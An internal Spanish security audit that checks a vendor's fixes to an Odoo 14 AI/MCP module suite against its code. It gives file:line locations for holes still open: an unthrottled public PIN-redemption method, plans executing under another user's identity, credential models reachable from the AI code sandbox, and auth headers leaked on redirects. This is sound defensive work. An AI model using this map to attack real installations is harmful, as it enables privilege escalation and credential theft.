# Comparación con la versión 3.1.879 del fabricante (pns_ai, Odoo 14) — pasadas A y B

- **Fecha:** 22/10/2026.
- **Objeto:** verificar contra el código la respuesta del fabricante
  (`_fabricante/doc/20261022_pns_ai_auditoria.md`) a nuestro informe de seguridad. Pasada A: §4
  (Seguridad) completo, parches 1 a 12, PNS-97/98 y compatibilidad con Python 3.7.3 / Odoo 14.
- **Pasada B:** cubre §5 a §10 (arquitectura y fallos, features planificadas, «no se hará», cambios no
  anunciados y superficie nueva, actualización desde 3.1.782), con las mismas reglas y estados.
- **Código comparado:** `_fabricante/3.1.879/` (`pns_base` 1.2.47, `pns_ai_mcp` 3.1.879,
  `pns_ai_chatboo` 2.1.538), frente a la base `_fabricante/3.1.782/` y a nuestra rama
  `14.0-pns-ai-correcciones` (parches 1 a 12).
- **Método:** lectura de código, solo estática (Grep/lectura; sin ejecutar Python ni Odoo). Ninguna
  afirmación del fabricante se da por buena: cada estado sale del código de 3.1.879. Lo que depende de
  la ejecución se marca **REQUIERE PRUEBA** y se describe en §4.
- **Rutas:** salvo indicación, relativas a `_fabricante/3.1.879/`. Las del core, a
  `/opt/odoo-src/14.0/odoo/`.
- **Estados:** **VERIFICADO** (el código cubre la ficha y sus puntos de entrada) · **PARCIAL** (queda un
  resto concreto) · **NO CORREGIDO** · **REQUIERE PRUEBA** (no se puede decidir leyendo código).
- **Verificación (fase 4, 22/10/2026):** `odoo-reviewer`, solo lectura, comprobó contra
  `_fabricante/3.1.879`, `_fabricante/3.1.782`, la rama y el core de Odoo 14 los parches 1 a 12, los
  agujeros M1, M2, M10, M11, M12, M13, F1, `collect_pin`, PNS-37, 54, 97 y 98, y §9. Las pruebas de M10
  se contrastaron además en la conversación principal. Correcciones aplicadas: parche 6 (`_on_crash`),
  adaptación de los parches 10 y 12, M10 a **Crítica**, matices de M11, M1/M2, F1, PNS-83, P-37, §9.1,
  §9.2 (U10, U15, U17) y P-9c retirada.
- **Decisión sobre N12** (seguir con 3.1.782 o cambiar de base): decidida, b′ (Sergio, 22/10/2026; se
  mantiene el 23/10/2026). Este documento no propone cambios de código ni decide nada.
- **Fase 3 en laboratorio (22-23/10/2026):** resultados en
  `docs/pendiente/fase3_lab_pns_ai_3879.md`, resumidos aquí en §3 (PNS-98), §5.6 (PNS-94 y PNS-70),
  §8.7 (M13, M10 y F4, nuevo) y §9.6 (P-9). N12 se mantiene en b′ (Sergio, 23/10/2026).

## 1. Resumen

### 1.1 Recuentos

**Fichas del §4 del fabricante (35, todas «Resuelto»):**

| Estado | N.º | Fichas |
|---|---|---|
| VERIFICADO | 26 | PNS-90, 85, 91, 92, 30, 37, obs. 8, 01, 02, 33, 20, obs. 2, obs. 3, 89, 28, 60, 65, 35, 55, 66, 62, 16, 59, 86, 22, 40 |
| PARCIAL | 9 | PNS-54 (Crítica), PNS-07 (Crítica), PNS-83 (Alta), PNS-19 (Alta), PNS-17 (Alta), PNS-82 (Alta), PNS-61, PNS-36, PNS-84 |
| NO CORREGIDO | 0 | — |
| REQUIERE PRUEBA (como estado principal) | 0 | Hay puntos concretos que requieren prueba dentro de 13 filas (PNS-83, 82, 07, 19, 84, 28, 60, 61, 36, 17, 54, 40 y parche 6); se detallan en §3 y §4 |

**Parches de Seges 1 a 12 (comprobación «Cómo comprobar si el fabricante ya lo ha corregido»):**

| Resultado | Parches |
|---|---|
| Criterio cumplido en 3.1.879 | 1, 2, 3, 4, 5, 7, 8, 9, 10 |
| Criterio cumplido por código, pendiente de la prueba de 5 casos | 6 |
| Criterio no cumplido (corrección distinta) | 11 (el `unlink` sigue borrando en `sudo` adjuntos de otros creadores), 12 (el fabricante protege solo los grupos «cúspide», no exige `base.group_system`) |

**Hallazgos aún no comunicados:** PNS-97 **NO CORREGIDO**; PNS-98 **NO CORREGIDO** (con prueba de
confirmación propuesta).

**Compatibilidad con Python 3.7.3 / Odoo 14:** ninguna construcción de Python 3.8+ que falle al
importar o al ejecutar; los cuatro fallos de PNS-81 están corregidos con el mismo criterio que
nuestros parches 1 a 4. Queda una degradación funcional nueva en `pns_ai_chatboo` (no de seguridad) y
la comprobación definitiva con `odoo-dev 14 paridad` (fase 3).

**Pasada B — fichas del fabricante de §4 a §7 (77, las de su recuento, auditoría `:62-68`):**

| Sección | VERIFICADO | PARCIAL | NO CORREGIDO | REQUIERE PRUEBA | Total |
|---|---|---|---|---|---|
| §4 Seguridad (pasada A, §2.1) | 26 | 9 | 0 | 0 | 35 |
| §5 Arquitectura y fallos (§5) | 18 | 5 | 0 | 1 | 24 |
| §6 Features planificadas (§6) | 6 | 4 | 0 | 1 | 11 |
| §7 No se hará (estado de la defensa alegada, §7) | 3 | 3 | 1 | 0 | 7 |
| **Total** | **53** | **21** | **1** | **2** | **77** |

- **Salvedad sobre PNS-30 (§2.1, VERIFICADO):** M11 (§8.7) muestra que su «Check para Seges»
  (auditoría `:219-220`) sigue dando resultado por los envoltorios públicos `log_*` de
  `models/ai_execution_engine.py:402-756`, que escriben en `ai.log` con un `user_id` arbitrario (también
  desde portal). El VERIFICADO de §2.1 solo vale para `_create_log_entry`; el recuento no lo cambia.
- Fichas PARCIAL de §5-§6 con gravedad del resto valorada: PNS-26 (ficha Alta, resto Baja, §5.6) y
  PNS-37 parte (resto Alta propuesta, §6.1).

**Pasada B — superficie nueva y cambios no anunciados (§8, 39 elementos):** 28 VERIFICADO, 4 PARCIAL
(F1, D1, M5, M16), 7 NO CORREGIDO (M13, M10, M1, M2, M11, M12 y F4, este último hallado en la fase 3),
0 REQUIERE PRUEBA como estado principal. Por gravedad propuesta: **Crítica 1** (M10, ya en 3.1.782 y en
la rama), **Alta 1** (M13, nuevo), Media 4 (M1, M2, F1 nuevos; M11 ya en 3.1.782), Baja 5. M10 y M13,
confirmados en la fase 3 (§8.7).

**Pasada B — actualización desde 3.1.782 (§9):** 21 pasos del `-u` revisados (U1 a U21): ningún script
de migración nuevo (ni se ejecutaría ninguno en Odoo 14); **1 contradicción** con las notas de versión
(U9: el core borraría `ai_log.agent_id`); **4 cambios no anunciados** (U6 parámetros renombrados, U11
agente «Decision» huérfano, U15 tres skills nuevas, U16 historial de Chatboo reescrito); 5 pruebas
(P-9a a P-9f; P-9c retirada en la verificación). Los parches 1 a 12 no dejan datos ni XML ID que el `-u` rompa o deje huérfanos (§9.4).

### 1.2 Parches de Seges que dejarían de hacer falta según el código

- **1, 2, 3, 4 y 5:** sí. La corrección del fabricante es equivalente (en el 2, casi idéntica).
- **6:** sí por código (`rollback` antes de cada `_finalize` y pantalla en cursor corto), a falta de
  repetir los 5 casos con imagen. `_on_crash` corre en un cursor nuevo después de cerrarse el del
  turno: no hereda locks (`pns_ai_chatboo/models/chatboo_job.py:204-222, 247-250`).
- **7, 8 y 9:** sí. Además, la parte del sandbox mejora la nuestra: se bloquean todos los nombres con
  `_` en las dos capas, incluido el alias `f = m._metodo` (D-2).
- **10:** sí según su criterio, pero **3.1.879 añade una vía nueva que la anula**:
  `ai.key.pin.ask.collect_pin`, pública, devuelve la clave MCP en claro sin pasar por el límite por IP
  (§3, PNS-83). Nuestro parche 10 no la cubre porque en 3.1.782 no existe. Adaptación: renombrarla a
  `_collect_pin` (su único llamador es `models/mcp_user.py:766`).
- **11:** no del todo: el filtro del fabricante cierra la reclamación (RPC, portal, `/jsonrpc`, búfer +
  `request_cancel`), pero el `unlink` de la sesión sigue borrando en `sudo` todos sus adjuntos, también
  los de otros creadores (nuestra prueba 4 bis de E2 fallaría).
- **12:** no: el diseño es distinto. Ningún plan da ni quita grupos «cúspide» (`base.group_system`,
  `base.group_erp_manager` y los que los implican), apruebe quien apruebe. Pero un AI Administrator sin
  Ajustes puede seguir dando o quitando por un plan cualquier otro grupo, también los de gestión de
  negocio, a cualquier usuario (nuestro parche 12 se lo impide). **Ninguno de los dos criterios cierra
  M10** (§8.7): el parche 12 comprueba `self.env.user` (`ai_system_action.py:709` (rama)), que en un plan
  lanzado por `cleanup_stuck_state` es el usuario suplantado.

### 1.3 Lo más grave

| PNS | Gravedad | Qué queda | Dónde |
|---|---|---|---|
| PNS-54 | Crítica | El token de la tarjeta no frena a un script en la página: `/pns_ai_mcp/verification/pending` y `card_payload` emiten tokens nuevos por RPC, y `action_confirm_and_execute` (público, sin token ni espera) confirma y ejecuta | `controllers/verification_ui.py:142-146`; `models/safe_operation.py:1765-1831, 2003-2048` |
| PNS-83 | Alta | `ai.key.pin.ask.collect_pin(pin)`, pública y nueva: canje de PIN sin límite por IP y sin grupo; con mesa abierta, la pestaña del administrador responde sola con la clave (con 8 dígitos la fuerza bruta no es práctica). Lo que pesa: cualquier usuario, también portal, provoca una denegación de servicio, porque sin mesa abierta cada llamada ocupa un worker 20 s | `models/key_pin_desk.py:193-220`; `static/src/js/key_pin_desk_v14.js:190-228` |
| PNS-19 | Alta | Los modelos de credenciales solo se cierran en `env[...]`: se llega a `ai.provider.api_key` por relaciones desde modelos no cerrados (`ai.log.provider_id`) o por `env.ref(...)` | `controllers/validators_base.py:187-209, 405-415`; `controllers/context_builder.py:83-117`; `models/ai_log.py:172-179` |
| PNS-17 | Alta | En una redirección a otro host solo se quitan las cabeceras de una lista fija; la cabecera personalizada de autenticación de un servidor OpenAPI (`auth_header_name`) viaja al host nuevo | `utils/fetch_url_safe.py:98-110, 156-159`; `lib/api/drivers/base.py:47-50` |
| PNS-07 | Crítica | Los métodos privados quedan cerrados, pero siguen alcanzables métodos públicos que escriben en un cursor propio con commit (p. ej. `chatboo.session.fulfill_client_export`) | `pns_ai_chatboo/models/chatboo_session.py:541-564`; `utils/session_download.py:365-392` |

**Pasada B** (gravedad del informe o propuesta; «ya en 3.1.782» = también en la rama):

| Id | Gravedad | Qué queda | Dónde |
|---|---|---|---|
| M10 | **Crítica** (requiere AI Administrator; ya en 3.1.782 y en la rama) | `create` libre de `ai.safe.operation` más `cleanup_stuck_state` público: un plan se ejecuta con la identidad de otro usuario. En la rama, el AI Administrator se da `base.group_system` (el parche 12 no lo frena); en 3.1.879 la cúspide no cubre `ir.cron`, `ir.actions.server`, `ir.rule` ni `ir.model.access` (confirmado en P-8b con `ir.cron`, fase 3) | `models/safe_operation.py:1006-1080` (§8.7) |
| PNS-37 (parte) | Alta (propuesta; requiere AI Administrator o un plan de escritura) | El cron nuevo de la papelera borra como superusuario lo que digan filas del diario que un AI Administrator puede editar; y el «borrado» de un plan solo exige escritura (archiva) y el cron borra después, saltando las reglas de borrado | `models/ai_change_journal.py:541-575, 612-633`; `data/journal_trash_cron.xml:5-15`; `security/ir.model.access.csv:42-43`; `controllers/safe_plan.py:938-953` (§6.1) |
| M13 | Alta (nuevo) | `ai.context.unlink_retired_from_module` es público, también para portal: borra los contextos de fábrica (system prompt incluido) con la lista de códigos que pone quien llama | `models/ai_context_disk.py:757-796` (§8.7) |
| PNS-20 (parte) | Alta (REQUIERE PRUEBA) | «Revisar» ejecuta la importación real dentro de un `SAVEPOINT` de SQL que no cubre las escrituras diferidas del ORM | `pns_base/models/operation_report_wizard.py:290-291, 305-323` (§6.1) |
| PNS-18 | — | «Sin failover externo» se aplica después de los filtros de rol y de cuota, y no en roles sin cubrir: un turno con imagen o sin cuota puede ir a un externo | `models/ai_execution_engine.py:252-263, 305-316` (§6.1) |
| PNS-70 | **Alta** (23/10/2026; antes Media) | La Chart.js 4.4.8 de Chatboo queda en `window.Chart` y las vistas gráfico de Odoo 14 la usan: **confirmado** en P-70 (fase 3). En 3.1.782 la 4.4.8 ocupa `window.Chart` desde que se carga el backend, sin efecto observado en los gráficos de Odoo (staging, 23/10/2026) | `pns_ai_chatboo/static/src/js/chatboo_heavy_libs.js:24-33` (§5.6) |
| M11 | Media (ya en 3.1.782) | Envoltorios `log_*` públicos (también portal) que escriben en `ai.log` a nombre de cualquier usuario: es el «Check para Seges» de PNS-30, que §2.1 da por VERIFICADO mirando solo `_create_log_entry` | `models/ai_execution_engine.py:402-756` (§8.7) |
| M1 / M2 | Media (nuevos) | `paint_canvas` escribe el lienzo de la sesión de otro usuario; `page_html` lee en `sudo` imágenes de cualquier modelo | `pns_ai_chatboo/models/chatboo_session.py:897-943, 974-1017, 1049-1184`; `models/chatboo_canvas.py:639, 677-697` (§8.7) |
| F1 | Media (nuevo) | El lienzo no tiene CSP: el documento puede enviar los datos a cualquier host; las filas van al `<script>` sin escapar `</` | `pns_ai_chatboo/models/chatboo_canvas.py:500-573, 1097-1109` (§8.4) |
| U9 (§9) | Datos | El `-u` borraría la columna `ai_log.agent_id` (lo hace el core al quitar el campo), contra lo que dicen la ficha PNS-87 y la nota del 20/10 | `odoo/addons/base/models/ir_model.py:725-739, 825-871, 2254-2328` (§9.2) |
| U16 (§9) | Datos | El `-u` reescribe en sitio el historial de todas las sesiones de Chatboo, sin anunciarlo; no se deshace sin copia | `pns_ai_chatboo/models/chatboo_session.py:192-199`; `pns_ai_mcp/utils/markup_rename.py:55-72` (§9.2) |

### 1.4 Límites de este análisis

- Los tests que cita el fabricante como «Checks nuestros» (`unit_tests/test_rpc_perimeter.py`,
  `test_sandbox_private_attrs.py`, `test_sandbox_credentials.py`, `test_odoo14_python37.py`, etc.) **no
  vienen en el paquete**: 3.1.879 no trae ninguna carpeta `unit_tests/`, solo `pns_ai_mcp/tests/` (31
  archivos). No se ha podido comprobar lo que dicen que prueban.
- Análisis estático: no se ha compilado nada con Python 3.7.3 ni se ha cargado en Odoo. Algunas
  construcciones (p. ej. `continue` dentro de `finally`, 3.8+) no se buscaron con patrón fiable.
- `pns_base` llega como 1.2.47, que en el registro de entregas del fabricante (§10 de su informe) es la
  numeración de Odoo 19 (la de Odoo 14 sería 1.2.37/1.2.38). El código es de Odoo 14 (`fields_view_get`,
  `ir.translation`) y todos los nombres que importan los otros dos módulos existen. **Pasada B (§9.1):**
  el contenido corresponde a la 1.2.38 de Odoo 14 (trae la vista previa de la 16.ª entrega); el número
  no casa con el contenido y solo el fabricante puede decir de qué commit sale. No afecta al `-u` desde
  1.2.32.
- Las fichas de §5-§7 y la superficie nueva (Canvas, papelera del diario, vista previa de importación,
  topes de gasto…) se han revisado en la pasada B (§5 a §8).
- **Pasada B, §9:** la comparación de campos se hizo con un Grep de declaraciones en una línea
  (`^\s+\w+ = fields\.`); una declaración con otra forma no se habría visto. Lo que el `-u` hace con los
  datos sale de leer el core de Odoo 14 (`loading.py`, `migration.py`, `ir_model.py`), sin ejecutarlo,
  y sin consultar las BD de LIYBEN ni de `pns_demo` (personalizaciones de fábrica, PIN, sesiones): de
  ahí P-9a a P-9f.
- **Pasada B, §10:** reúne hechos para N12; no pondera ni recomienda.
- Los scripts `pruebas_e1_*.py` y `pruebas_e2_*.py` no están en este repo (se citan en
  `docs/pendiente/verificacion_seguridad_pns_ai.md`); su adaptación se describe a partir de esa
  documentación.

## 2. Tabla de la pasada A

### 2.1 Fichas del §4 del fabricante

Columna «Fabricante»: estado y versión de su ficha. «Rama Seges»: parche o entrega del
[plan](../pendiente/plan_correccion_pns_ai.md). «Comparación»: con nuestra corrección, si la hay.
«Checks»: las «Checks para Seges» de su ficha y si se repiten con nuestros tests o scripts.

#### §4.1 Métodos públicos en `sudo`

| PNS | Grav. | Fabricante | 3.1.879 (archivo:línea) | Resultado | Rama Seges | Comparación | Checks para Seges / reproducible |
|---|---|---|---|---|---|---|---|
| PNS-83 | Alta | Resuelto, 3.1.833 | `_redeem_key_pin`, `_consume_key_pin` privados (`models/mcp_user.py:745, 788`); `_is_blocked`, `_note_failure`, `_release_all` privados y sin IP cuentan en `?` (`models/key_pin_block.py:20-24, 46, 52, 73`). **Nuevo y público:** `ai.key.pin.ask.collect_pin(pin)` (`models/key_pin_desk.py:193-201`) → `_collect` con cursor de superusuario (`:203-220`). Siguen públicos `any_open`, `touch`, `close`, `notify_changed`, `collect`, `supply` (`:41, 90, 126, 137, 184, 253`). `_redeem_key_pin` no tiene llamador en los tres módulos | **PARCIAL** | Parche 10 (E1); resto D-3 de E1 previsto en E4 | Criterio del parche 10 cumplido; pero `collect_pin` es una vía de canje nueva sin límite ni grupo (§3) | RPC a `redeem_key_pin`/`release_all` con interno y portal: **sí**, `test_key_pin_refused` y prueba 4 de `pruebas_e1_rpc.py`, tal cual. «Fila de la IP real»: **no** reproducible (no hay ruta que llame a `_redeem_key_pin`). Falta un caso para `collect_pin` |
| PNS-90 | Alta | Resuelto, 3.1.833 | `_get_cached`, `_store` privados (`models/fetch_cache.py:64, 92`); llamadores en `controllers/safe_plan.py:1673, 1721, 1777`. `ai.api.result.cache` también privado (`models/api_result_cache.py:87, 100`). `gc_expired` sigue público (`fetch_cache.py:128`, solo borra caducadas) | **VERIFICADO** | Parche 7 (E1) | Equivalente en RPC; mejor en sandbox (bloqueo general de `_`) y además cierra `ai.api.result.cache` (D-3 de E1) | Sí: `test_fetch_cache_refused`, prueba 1 de `pruebas_e1_rpc.py` y prueba 6 (`/jsonrpc`), tal cual |
| PNS-82 | Alta | Resuelto, 2.1.512 | Los cuatro métodos privados (`pns_ai_chatboo/models/chatboo_session.py:407, 424, 451, 465`); `_claim_turn_file_chips` solo engancha adjuntos sueltos con `create_uid` = dueño de la sesión (`:496`). ACL de `chatboo.async.request` `1,0,0,0` (`pns_ai_chatboo/security/ir.model.access.csv:3`). `unlink` borra en `sudo` **todos** los adjuntos de la sesión antes de comprobar acceso (`chatboo_session.py:1989-1995`) | **PARCIAL** | Parche 11 (E2) | RPC, portal, `/jsonrpc` y búfer + `request_cancel`: equivalente (mejor en el búfer: no se pueden crear jobs por RPC). `unlink`: peor (sin filtro de creador ni `check_access_rule` previo) | Sí, con adaptación: pruebas 1 y 3 de `pruebas_e2_rpc.py` tal cual; prueba 2 y `test_staged_buffer_does_not_hijack` crean el job por RPC (ahora `AccessError`); prueba 4 bis y `test_unlink_own_session_keeps_foreign` / `test_cron_unlink_sudo_keeps_foreign` fallarán (diferencia real) |
| PNS-85 | Media | Resuelto, 3.1.833 | `_lookup_for_skill`, `_remember_for_skill` (`models/ai_skill_param_cache.py:92, 126`); `_lookup_param_cache`, `_remember_param_cache` (`models/ai_skill.py:354, 363`); motor por nombre privado (`utils/engine_skills.py:147, 239`) | **VERIFICADO** | Parche 9 (E1) | Equivalente; mejor en sandbox | Sí: `test_skill_param_cache_refused`, prueba 3 de `pruebas_e1_rpc.py`. `test_agent_engine_uses_private_names` hay que adaptarlo (`engine_skills.py`) |
| PNS-91 | Media | Resuelto, 3.1.833 | `_ensure_domain_whitelisted` privado (`models/url_whitelist.py:235`); llamadores `safe_plan.py:779`, `models/safe_operation.py:1141, 1172`, `models/external_server.py:1018, 1080` | **VERIFICADO** | Parche 8 (E1) | Equivalente. Diferencia funcional: con política `open` confirmar ya no añade el dominio (PNS-16), nosotros lo conservábamos | Sí: `test_url_whitelist_refused` y prueba 2 de `pruebas_e1_rpc.py`. `test_whitelist_internal_paths` y R2a de E1 hay que adaptarlos a la política `open` |
| PNS-92 | Media | Resuelto, 3.1.833 | `_ensure_key_admin()` es la primera instrucción de `action_generate_mcp_api_key` y `set_mcp_api_key` (`models/mcp_user.py:440, 451`; método `:737-742`, `AccessError`) | **VERIFICADO** | Previsto en E4 | — (sin parche) | Sí, adaptando la prueba 3c (seis intentos): el error debe venir ahora de `_ensure_key_admin`, no de la línea del log |
| PNS-30 (resto) | Media | Resuelto, 3.1.833 / 2.1.512 | `_create_log_entry` privado (`models/ai_log.py:686`); llamadores privados o en `sudo` con `env.uid` (p. ej. `pns_ai_chatboo/models/chatboo_canvas.py:602-603`) | **VERIFICADO** | Previsto en E4 | — | Sí: caso nuevo en el estilo de `test_seges_rpc_access.py` (`create_log_entry` y `_create_log_entry` por RPC) |
| PNS-37 (resto) | Media | Resuelto, 3.1.833 | `_record_failed_plan` privado y `intended_values` con `redact_record` (`models/ai_change_journal.py:375, 409`); llamador `safe_operation.py:1501` | **VERIFICADO** | Previsto en E4 | — | Sí: caso RPC nuevo |
| Obs. 8 | — | Resuelto, 3.1.833 | `ai.execution.engine._choose` y `ai.provider._choose` privados (`models/ai_execution_engine.py:323`, `models/ai_provider.py:587`); llamador `utils/engine_discovery.py:121, 197` | **VERIFICADO** | — | — | Sí: caso RPC nuevo |

#### §4.2 Escalada y sandbox

| PNS | Grav. | Fabricante | 3.1.879 (archivo:línea) | Resultado | Rama Seges | Comparación | Checks para Seges / reproducible |
|---|---|---|---|---|---|---|---|
| PNS-01 (resto) | Crítica | Resuelto, 3.1.821 | `_resolve_group_below_cusp` (`models/ai_system_action.py:700-708`) al proponer y al ejecutar dar grupo (`:719-745`); cúspide en `utils/privilege_cusp.py:13, 72-87`; vía CRUD (`groups_id`, `in_group_*`, `sel_groups_*`, `implied_ids`) al proponer (`controllers/safe_plan.py:270-271`) y al ejecutar (`:881-940`) | **VERIFICADO** (para `base.group_system`) | Parche 12 (E2) | **Distinta.** Más estricta en la cúspide (tampoco un administrador de Ajustes puede por un plan) y cubre la vía CRUD; menos estricta fuera de ella: un AI Administrator sin Ajustes puede dar cualquier grupo no cúspide | Sí, con adaptación: pruebas 6 y 7 de `pruebas_e2_mcp.py` (cambia el mensaje). `test_settings_admin_adds_and_removes` fallará por diseño. Añadir: AI Administrator sin Ajustes da un grupo no cúspide |
| PNS-02 (resto) | Crítica | Resuelto, 3.1.821 | Quitar grupo con el mismo control (`ai_system_action.py:747-775`) | **VERIFICADO** (para la cúspide) | Parche 12 (E2) | Distinta (igual que PNS-01). La prueba 8 de E2 (quitar «Creación de contactos» como AI Administrator sin Ajustes) **pasaría** en 3.1.879 | Sí, con adaptación (prueba 8 de `pruebas_e2_mcp.py`: el resultado esperado cambia) |
| PNS-07 (resto) | Crítica | Resuelto, 3.1.835 | `blocked_private_attr` (`controllers/validators_base.py:154-170`) en el AST (atributo, `getattr`, `attrgetter`, `methodcaller`, campos de `.format` literales: `controllers/validators.py:298-304, 351-376, 385-402`) y en ejecución (`controllers/context_builder.py:104-109, 131-183, 236-246, 292-318`); `getattr` endurecido en los builtins (`:434`). **Resto:** métodos **públicos** que escriben en cursor propio con commit siguen alcanzables, p. ej. `chatboo.session.fulfill_client_export` (`pns_ai_chatboo/models/chatboo_session.py:541-564` → `utils/session_download.py:365-392`) | **PARCIAL** | E1 parcial (lista negra); resto previsto en E3 | Mejor que la nuestra en métodos privados (criterio general; cierra el alias D-2). El resto de E3 (`fulfill_client_export`, D-3 de E2) sigue abierto también aquí | Sí: prueba 5 de `pruebas_e1_mcp.py` (5a-5c) tal cual, con mensajes nuevos; añadir `_claim_execute`/`_execute_plan_with_timeouts` (su check) y `fulfill_client_export` |
| PNS-19 (resto) | Alta | Resuelto, 3.1.834 / 3.1.835 | `_api_key_for_inference` cerrado por el bloqueo de `_` (`models/ai_provider.py:201-209`); modelos de credenciales en `RELAXAICODE_CREDENTIAL_MODELS` (`validators_base.py:187-209`), comprobados en `env[...]`/`env.get` (`context_builder.py:83-99`). **Resto:** sin control al recorrer relaciones (`ai.log.provider_id` → `ai.provider`, `models/ai_log.py:172-179`; `api_key` con `groups=group_ai_admin`, `ai_provider.py:194-199`) ni en `env.ref(...)` (`context_builder.py:104-117` deja pasar `ref`) | **PARCIAL** | Previsto en E3 | — (sin parche; E3 previsto) | Sí: pedir por `/mcp` (sin LLM, como `pruebas_e1_mcp.py`) `env['ai.provider']` y `env['ir.config_parameter']` → rechazo; añadir el recorrido por `ai.log` con un AI Administrator |

#### §4.3 Secretos

| PNS | Grav. | Fabricante | 3.1.879 (archivo:línea) | Resultado | Rama Seges | Comparación | Checks para Seges / reproducible |
|---|---|---|---|---|---|---|---|
| PNS-84 | Media | Resuelto, 3.1.838 | Sin campo de PIN en `ai.mcp.user`; columnas viejas en fósiles (`utils/schema_fossils.py:60-62`); al vencer la espera la fila se borra (`models/key_pin_desk.py:247-250`). **Resto:** el PIN y la clave en tránsito siguen en `ai.key.pin.ask` (`:168-175`), legibles por cualquier AI Administrator (`security/ir.model.access.csv:81`); `touch` devuelve los PIN pendientes a toda mesa (`key_pin_desk.py:111-124`); si muere el worker que espera, `supplied_key` queda hasta el siguiente `_collect` (`:177-182, 204-205`) | **PARCIAL** | «Después» | — | Sí por SQL (`SELECT` de columnas `key_pin*` y de `ai_key_pin_ask`); el canje tardío requiere mesa abierta |
| PNS-33 | Media | Resuelto, 3.1.838 | `_extract_api_key` solo cabeceras (`controllers/main.py:432-450`); `extract_user_token_from_request` solo `X-Mcp-Token` (`lib/llm/utils/mcp_utils.py:99-133`); sin `api_key[:` en el controlador (Grep) | **VERIFICADO** (URL y log) | — | — | Sí: petición a `/mcp` con `?api_key=` (estilo `pruebas_e1_mcp.py`) y búsqueda en el log |
| PNS-20 (resto) | Alta | Resuelto, 3.1.838 | `replace_existing` `default=False` en la copia de configuración (`wizard/config_backup_wizard.py:44-46`). Nota: otros asistentes de importación siguen con `default=True` (usuarios MCP con clave, proveedores, agentes, servidores, lista blanca, paquetes: `wizard/import_users_wizard.py:26-27`, `import_servers_wizard.py:25-27`, etc.) | **VERIFICADO** | — | — | Sí, en la interfaz |
| Obs. 2 | — | Resuelto, 3.1.838 | Sin fragmentos de la clave en el log (Grep de `api_key[` en `controllers/`: vacío) | **VERIFICADO** | — | — | Sí (log de una petición `/mcp`) |
| Obs. 3 | — | Resuelto, 3.1.838 | `api_key` con `copy=False` (`models/ai_provider.py:194-199`) | **VERIFICADO** | — | — | Sí, en la interfaz |

#### §4.4 Perímetro web y cliente

| PNS | Grav. | Fabricante | 3.1.879 (archivo:línea) | Resultado | Rama Seges | Comparación | Checks para Seges / reproducible |
|---|---|---|---|---|---|---|---|
| PNS-89 | Baja | Resuelto, 3.1.839 | `/pns_ai_mcp/key_pin/stop` sin `csrf=False` (`controllers/key_pin.py:37-41`; en Odoo 14 el CSRF se exige por defecto, `odoo/http.py:779-780`); token con `crypto.getRandomValues` (`static/src/js/key_pin_desk_v14.js:43-51`); el `csrf_token` viaja en la URL (`:55-56`) | **VERIFICADO** | Previsto en E4 | — | Sí: `POST` sin `csrf_token` (script nuevo) |
| PNS-28 (resto) | Media | Resuelto, 3.1.839 | `_mcp_origin_ok` antes de la clave en todas las rutas no OPTIONS (`controllers/main.py:301-311, 522, 638, 737, 758`; `utils/mcp_origin.py:38-49`). Las rutas siguen con `cors='*'`. **Salvedad:** en Odoo 14 el preflight `OPTIONS` lo contesta el core antes del controlador (`odoo/http.py:771-777`) con `Access-Control-Allow-Origin: *` (`:1257-1258`), así que «el OPTIONS valida igual» no es cierto en 14 (sin efecto: la petición real responde 403) | **VERIFICADO** | — | — | Sí, con `curl` (`Origin` ajeno → 403); OPTIONS: REQUIERE PRUEBA |
| PNS-60 (resto) | Alta | Resuelto, 2.1.514 / 2.1.517 | Saneador de lista blanca en documento inerte, dos pasadas (`pns_ai_chatboo/static/src/js/chatboo_formatters.js:122-152, 224-259, 317-374`); sin `showdown.js` en `static/src/js/`; se admiten `BUTTON`, `style` local, `id` y todo `data-*` | **VERIFICADO** (código) | «Después» | — | Sí, en el navegador (prueba 8 de staging del 16/10 y su check); los `data-*` y `BUTTON` necesitan inventario de manejadores (§4) |
| PNS-65 (resto) | Media | Resuelto, 2.1.514 / 2.1.515 | `mimetype` por `kind` en servidor (`pns_ai_chatboo/models/chatboo_session.py:535-552`); `_fulfillPendingExportsInView` no existe (Grep en `pns_ai_chatboo/`) | **VERIFICADO** | — | — | Sí, en la interfaz |
| PNS-35 | Media | Resuelto, 3.1.839 | Prefijo `'` para `=`, `+`, `-`, `@` en las dos vías (`utils/artifact_export.py:2244, 2329-2333, 2397`; `controllers/formatters.py:339-342`) | **VERIFICADO** | — | — | Sí, exportando `=1+1` |
| PNS-61 (resto) | Media | Resuelto, 2.1.514 | `/chatboo/stream` ignora el `history` del cuerpo y usa `get_model_history` (`pns_ai_chatboo/controllers/chatboo.py:799-801, 826`; `models/chatboo_session.py:219-239`). **Resto:** el navegador sigue escribiendo los `messages` de los que sale ese historial: `/chatboo/sessions/save` (`controllers/chatboo.py:422-455`) y `write` por ORM en la sesión propia; los mensajes `verification_ack` pasan el filtro (`chatboo_session.py:230-232`) | **PARCIAL** | «Después» | — | Su check (history inventado en `/chatboo/stream`) sí; falta el caso por `/chatboo/sessions/save` |
| PNS-55 (resto) | Alta | Resuelto, 2.1.514 | ACL `1,0,0,0` (`pns_ai_chatboo/security/ir.model.access.csv:3`) y regla sin escritura (`security/security.xml:20-29`); jobs creados en `sudo` (`models/chatboo_async_request.py:104-118`); `recover_orphan_download_chips` comprueba dueño (`chatboo_session.py:597-599`). `cron_maintenance` sigue público (`chatboo_async_request.py:1559-1585`) | **VERIFICADO** | «Después» (D-3 de E2 en E4) | — | Sí: RPC `create`/`write` de un job (ahora `AccessError`) y `recover_orphan_download_chips` sobre sesión ajena |
| PNS-66 | Media | Resuelto, 3.1.839 / 2.1.514 | `required_group_ids` (`models/ai_skill.py:230`); `user_may_run` (`:933-939`) al listar (`:941-946`), en disparadores (`utils/engine_skills.py:315-335`) y al resolver (`:337-352`); `required_groups: pns_ai_mcp.group_ai_admin` en `users_all.md`, `users_logged.md`, `sys_info.md` | **VERIFICADO** | — | — | Sí, en el chat (`/users-all` con usuario sin IA) |
| PNS-62 (resto) | Media | Resuelto, 2.1.514 | Topes 20 ficheros / 50 MB y tope por fichero no desactivable (`pns_ai_chatboo/utils/chatboo_product_icp.py:37-106`), comprobados en servidor (`controllers/chatboo.py:835`) | **VERIFICADO** | — | — | Sí (RPC a `/chatboo/stream` con 21 ficheros) |
